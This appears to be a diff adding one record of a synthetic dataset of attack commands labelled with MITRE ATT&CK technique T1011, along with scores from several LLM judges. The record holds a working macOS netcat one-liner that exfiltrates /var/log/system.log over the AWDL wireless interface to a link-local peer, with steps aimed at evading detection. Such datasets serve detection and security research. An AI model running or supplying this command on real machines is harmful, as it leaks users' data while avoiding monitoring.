@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -u -s \"$(ipconfig getv6ifaddr awdl0)\" \"fe80::b0b:beef:1%awdl0\" 52789 < /var/log/system.log",
+  "explanation": "Exfiltrates data over the AWDL (Apple Wireless Direct Link) interface using IPv6 UDP to a link-local peer on an uncommon port, aligning with T1011 by leveraging a non-primary network medium distinct from typical egress paths.",
+  "rationale_steps": [
+    "Use ipconfig to obtain the IPv6 address assigned to the AWDL interface (awdl0).",
+    "Bind netcat to that source address to force use of the AWDL medium.",
+    "Send the selected data via IPv6 UDP to a link-local target on an uncommon port to reduce detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-bbd64a1a",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with valid nc options (-6, -u, -s), balanced quoting for the scoped IPv6 address, and correct input redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "It binds to the AWDL interface’s IPv6 address and sends /var/log/system.log via UDP to a link-local peer (%awdl0), aligning with T1011, though success depends on AWDL interface availability and peer reachability/reliability.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T00:19:57.801951Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid netcat flags, correct use of command substitution, and appropriate redirection syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly implements T1011 by exfiltrating system logs over AWDL (Apple's peer-to-peer wireless protocol) using IPv6 UDP on an uncommon port, which represents a non-primary network medium distinct from typical monitored channels.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T00:20:02.664830Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid `nc` flags, correct command substitution for a macOS-specific command, proper IPv6 address formatting with scope ID, and standard input redirection.",
+        "semantic_score": 3,
+        "semantic_justification": "While the `nc` command and network parameters correctly implement UDP exfiltration over AWDL using IPv6 as intended for T1011, the specified input file `/var/log/system.log` is generally not readable by a non-privileged user on modern macOS, which significantly hinders the operational plausibility of exfiltrating *that specific data* under the stated privilege.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T00:20:20.765062Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
